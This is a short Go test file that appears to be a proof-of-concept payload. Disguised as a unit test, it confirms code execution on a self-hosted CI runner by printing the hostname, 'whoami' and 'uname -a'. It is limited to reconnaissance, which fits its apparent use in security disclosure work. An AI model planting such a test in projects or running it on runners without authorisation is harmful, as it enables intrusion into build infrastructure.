// main_poc_test.go
package main

import (
	"fmt"
	"os"
	"os/exec"
	"testing"
)

func TestPoCReconOnly(t *testing.T) {
	fmt.Println("=== PoC: code execution confirmed on self-hosted runner ===")
	hostname, _ := os.Hostname()
	fmt.Println("hostname:", hostname)
	out, _ := exec.Command("whoami").CombinedOutput()
	fmt.Println("whoami:", string(out))
	out, _ = exec.Command("uname", "-a").CombinedOutput()
	fmt.Println("uname -a:", string(out))
}
